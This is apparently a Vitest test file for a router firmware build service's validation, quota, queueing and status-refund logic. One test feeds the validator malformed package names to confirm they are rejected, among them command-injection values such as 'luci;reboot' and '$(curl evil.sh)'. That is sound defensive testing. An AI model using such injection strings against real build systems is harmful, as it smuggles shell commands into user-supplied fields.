// Service-layer tests for src/lib/builds.ts: request validation against the real catalog,
// quota-enforced submission with queue position, and status sync + refund-once semantics
// (in-memory DB + mock executor; fresh userId per test isolates quota state).
import { randomUUID } from 'node:crypto'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { getBuildStatus, submitBuild, validateBuildRequest } from '@/lib/builds'
import type { BuildStatusView } from '@/lib/builds'
import { getCatalog } from '@/lib/catalog'
import { getDb } from '@/lib/db'
import { getExecutor } from '@/lib/executor'
import type { BuildSpec } from '@/lib/executor'
import { checkAndConsume, currentUtcDay } from '@/lib/quota'

// A real (distro, version, target, profileId) combination straight from the committed catalog.
const device = getCatalog().devices.find((d) => d.builds.length > 0)!
const combo = {
  distro: device.builds[0].distro,
  version: device.builds[0].version,
  target: device.builds[0].target,
  profileId: device.builds[0].profileId,
}

function validCombo(): Record<string, unknown> {
  return { ...combo }
}

function body(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return { ...combo, packages: ['luci', '-ppp'], config: { hostname: 'my-router' }, ...overrides }
}

function specOf(overrides: Record<string, unknown> = {}): BuildSpec {
  const result = validateBuildRequest(body(overrides))
  if (!result.ok) throw new Error(`fixture spec is invalid: ${result.error}`)
  return result.spec
}

/** Polls a build until it leaves queued/building (mock executor advances per poll). */
async function pollToTerminal(buildId: string, userId: string): Promise<BuildStatusView> {
  for (let i = 0; i < 10; i++) {
    const result = await getBuildStatus(buildId, userId)
    if (!result.ok) throw new Error(result.code)
    if (result.view.status !== 'queued' && result.view.status !== 'building') return result.view
  }
  throw new Error('build never reached a terminal state')
}

beforeEach(() => {
  vi.useFakeTimers()
  vi.setSystemTime(new Date('2026-07-06T12:00:00Z'))
})

afterEach(() => {
  vi.useRealTimers()
  vi.restoreAllMocks()
})

describe('validateBuildRequest', () => {
  it('accepts a real catalog combination with packages and whitelisted config', () => {
    const result = validateBuildRequest(body())
    expect(result).toEqual({
      ok: true,
      spec: { ...combo, packages: ['luci', '-ppp'], config: { hostname: 'my-router' }, communityPackages: [], uiLanguage: 'en' },
    })
  })

  it('defaults packages and config when omitted', () => {
    const result = validateBuildRequest({ ...combo })
    expect(result).toEqual({ ok: true, spec: { ...combo, packages: [], config: {}, communityPackages: [], uiLanguage: 'en' } })
  })

  it('rejects a non-object body', () => {
    expect(validateBuildRequest('nope')).toEqual({ ok: false, error: expect.stringMatching(/JSON object/) })
  })

  it('rejects an unknown distro', () => {
    const result = validateBuildRequest(body({ distro: 'kwrt' }))
    expect(result).toEqual({ ok: false, error: expect.stringMatching(/distro/) })
  })

  it.each([
    ['version', { version: '0.0.0' }],
    ['target', { target: 'no/such-target' }],
    ['profileId', { profileId: 'no-such-profile' }],
  ])('rejects a combination with a fake %s', (_field, overrides) => {
    const result = validateBuildRequest(body(overrides))
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toMatch(/not in the catalog/)
  })

  it.each([['luci;reboot'], ['$(curl evil.sh)'], ['a b'], ['pkg|pkg']])(
    'rejects the malformed package name %j',
    (pkg) => {
      const result = validateBuildRequest(body({ packages: [pkg] }))
      expect(result.ok).toBe(false)
      if (!result.ok) expect(result.error).toContain(JSON.stringify(pkg))
    },
  )

  it('rejects more than 200 packages', () => {
    const result = validateBuildRequest(body({ packages: Array.from({ length: 201 }, (_, i) => `pkg${i}`) }))
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toMatch(/200/)
  })

  it('rejects a non-array packages field', () => {
    expect(validateBuildRequest(body({ packages: 'luci' })).ok).toBe(false)
  })

  it.each([['pppoeUser'], ['sshAuthorizedKeys'], ['uciDefaults'], ['proxySubscriptionUrl']])(
    'rejects the non-whitelisted config field %s by name',
    (field) => {
      const result = validateBuildRequest(body({ config: { hostname: 'ok', [field]: 'x' } }))
      expect(result.ok).toBe(false)
      if (!result.ok) {
        expect(result.error).toContain(`"${field}"`)
        expect(result.error).toMatch(/not accepted/)
      }
    },
  )

  it('rejects a non-string config value', () => {
    const result = validateBuildRequest(body({ config: { hostname: 123 } }))
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toMatch(/"hostname".*string/)
  })

  it.each([
    ['hostname', 'has space'],
    ['hostname', '-leading'],
    ['hostname', 'trailing-'],
    ['hostname', 'x'.repeat(64)],
    ['timezone', ''],
    ['timezone', 'x'.repeat(65)],
    ['lanIp', '8.8.8.8'],
    ['lanIp', '999.168.1.1'],
    ['lanIp', '192.168.1'],
    ['rootPassword', 'x'.repeat(64)],
    ['wifiSsid', ''],
    ['wifiSsid', 'x'.repeat(33)],
    ['wifiPassword', 'x'.repeat(64)],
  ])('rejects invalid %s %j', (field, value) => {
    const result = validateBuildRequest(body({ config: { [field]: value } }))
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toContain(field)
  })

  it('accepts valid values for every whitelisted field', () => {
    const config = {
      hostname: 'my-router-2',
      timezone: 'Asia/Shanghai',
      lanIp: '192.168.1.1',
      rootPassword: 'secret',
      wifiSsid: 'HomeWiFi',
      wifiPassword: 'passphrase',
    }
    expect(validateBuildRequest(body({ config }))).toEqual({
      ok: true,
      spec: { ...combo, packages: ['luci', '-ppp'], config, communityPackages: [], uiLanguage: 'en' },
    })
  })

  describe('community packages & language validation', () => {
    const base = validCombo()

    it('accepts known community ids and defaults language to en', () => {
      const r = validateBuildRequest({ ...base, communityPackages: ['openclash'] })
      expect(r.ok).toBe(true)
      if (r.ok) {
        expect(r.spec.communityPackages).toEqual(['openclash'])
        expect(r.spec.uiLanguage).toBe('en')
      }
    })

    it('rejects an unknown community id', () => {
      const r = validateBuildRequest({ ...base, communityPackages: ['definitely-not-real'] })
      expect(r.ok).toBe(false)
      if (!r.ok) expect(r.error).toContain('definitely-not-real')
    })

    it('rejects a non-array communityPackages', () => {
      expect(validateBuildRequest({ ...base, communityPackages: 'openclash' }).ok).toBe(false)
    })

    it('accepts a whitelisted language and rejects others', () => {
      expect(validateBuildRequest({ ...base, uiLanguage: 'zh-cn' }).ok).toBe(true)
      const bad = validateBuildRequest({ ...base, uiLanguage: 'xx-yy' })
      expect(bad.ok).toBe(false)
      if (!bad.ok) expect(bad.error).toContain('language')
    })

    it('defaults communityPackages to [] when omitted', () => {
      const r = validateBuildRequest(base)
      if (r.ok) expect(r.spec.communityPackages).toEqual([])
    })
  })
})

describe('submitBuild', () => {
  it('creates a build, consumes quota and dispatches to the executor', async () => {
    const userId = randomUUID()
    const before = await getDb().builds.listActiveCount()
    const result = await submitBuild(userId, specOf())
    expect(result).toEqual({ ok: true, id: expect.any(String), queuePosition: Math.max(0, before + 1 - 10) })
    if (!result.ok) return
    const build = await getDb().builds.get(result.id)
    expect(build?.externalId).toMatch(/^mock-/)
    expect(build?.spec.profile).toBe(combo.profileId)
    expect(await getDb().quota.getUsedToday(userId, currentUtcDay())).toBe(1)
  })

  it('denies the second build of the day with the UTC reset time', async () => {
    const userId = randomUUID()
    expect((await submitBuild(userId, specOf())).ok).toBe(true)
    const denied = await submitBuild(userId, specOf())
    expect(denied.ok).toBe(false)
    if (!denied.ok && denied.code === 'quota') {
      expect(denied.resetAt.toISOString()).toBe('2026-07-07T00:00:00.000Z')
    } else {
      throw new Error('expected a quota denial')
    }
  })

  it('reports a queue position once 10 builds are active', async () => {
    const userId = randomUUID()
    const spec = specOf()
    // Pad the global active count to the concurrency cap (direct DB rows, no quota/executor).
    const padding: string[] = []
    while ((await getDb().builds.listActiveCount()) < 10) {
      const row = await getDb().builds.create({ userId: randomUUID(), spec: { ...spec, profile: spec.profileId } })
      padding.push(row.id)
    }
    const active = await getDb().builds.listActiveCount()
    const result = await submitBuild(userId, specOf())
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.queuePosition).toBe(active + 1 - 10)
    // Release the padded slots so later tests see a free queue again.
    for (const id of padding) await getDb().builds.updateStatus(id, { status: 'failed' })
  })

  it('refunds the quota and fails the build when the executor dispatch throws', async () => {
    const userId = randomUUID()
    vi.spyOn(getExecutor(), 'submit').mockRejectedValueOnce(new Error('dispatch down'))
    const result = await submitBuild(userId, specOf())
    expect(result).toEqual({ ok: false, code: 'executor' })
    // The quota was refunded, so the user can immediately try again.
    expect(await getDb().quota.getUsedToday(userId, currentUtcDay())).toBe(0)
    expect((await checkAndConsume(userId)).allowed).toBe(true)
  })
})

describe('getBuildStatus', () => {
  it('returns not-found for an unknown id', async () => {
    expect(await getBuildStatus(randomUUID(), randomUUID())).toEqual({ ok: false, code: 'not-found' })
  })

  it("returns forbidden for another user's build", async () => {
    const owner = randomUUID()
    const result = await submitBuild(owner, specOf())
    if (!result.ok) throw new Error('submit failed')
    expect(await getBuildStatus(result.id, randomUUID())).toEqual({ ok: false, code: 'forbidden' })
  })

  it('advances queued → building (with log) → success with a complete artifact', async () => {
    const userId = randomUUID()
    const submitted = await submitBuild(userId, specOf())
    if (!submitted.ok) throw new Error('submit failed')

    const first = await getBuildStatus(submitted.id, userId)
    if (!first.ok) throw new Error(first.code)
    expect(first.view.status).toBe('queued')
    expect(first.view.queuePosition).toBe(submitted.queuePosition)

    let sawBuilding = false
    let view: BuildStatusView = first.view
    for (let i = 0; i < 10 && view.status !== 'success'; i++) {
      const result = await getBuildStatus(submitted.id, userId)
      if (!result.ok) throw new Error(result.code)
      view = result.view
      if (view.status === 'building') {
        sawBuilding = true
        expect(view.log).toBeTruthy()
      }
    }
    expect(sawBuilding).toBe(true)
    expect(view.status).toBe('success')
    expect(view.log).toMatch(/sha256 checksums/)
    expect(view.artifact).toEqual({
      url: expect.stringMatching(/^https:\/\//),
      sha256: expect.stringMatching(/^[0-9a-f]{64}$/),
      sizeBytes: expect.any(Number),
      expiresAt: expect.any(String),
    })
    expect(view.artifactExpiresAt).toBe(view.artifact?.expiresAt)
    expect(view.failureHint).toBeNull()
    expect(view.quotaResetAt).toBeUndefined()
    // The DB snapshot was synced along the way.
    const build = await getDb().builds.get(submitted.id)
    expect(build?.status).toBe('success')
    expect(build?.artifactUrl).toBe(view.artifact?.url)
  })

  it('keeps the quota consumed on a package-conflict failure', async () => {
    const userId = randomUUID()
    const submitted = await submitBuild(userId, specOf({ packages: ['mock-fail-conflict'] }))
    if (!submitted.ok) throw new Error('submit failed')
    const view = await pollToTerminal(submitted.id, userId)
    expect(view.status).toBe('failed')
    expect(view.failureHint).toBe('package-conflict')
    expect(view.quotaRefunded).toBe(false)
    expect(view.quotaResetAt).toBe('2026-07-07T00:00:00.000Z')
    // User-caused failure: the day's quota stays consumed.
    expect(await getDb().quota.getUsedToday(userId, currentUtcDay())).toBe(1)
    expect((await checkAndConsume(userId)).allowed).toBe(false)
  })

  it('refunds the quota exactly once on a timeout', async () => {
    const userId = randomUUID()
    const submitted = await submitBuild(userId, specOf({ packages: ['mock-timeout'] }))
    if (!submitted.ok) throw new Error('submit failed')
    const view = await pollToTerminal(submitted.id, userId)
    expect(view.status).toBe('timeout')
    expect(view.quotaRefunded).toBe(true)
    expect(view.quotaResetAt).toBeUndefined()
    expect(await getDb().quota.getUsedToday(userId, currentUtcDay())).toBe(0)

    // Idempotency: consume the refunded unit, then poll again — no double refund.
    expect((await checkAndConsume(userId)).allowed).toBe(true)
    const again = await getBuildStatus(submitted.id, userId)
    if (!again.ok) throw new Error(again.code)
    expect(again.view.quotaRefunded).toBe(true)
    expect(await getDb().quota.getUsedToday(userId, currentUtcDay())).toBe(1)
  })
})
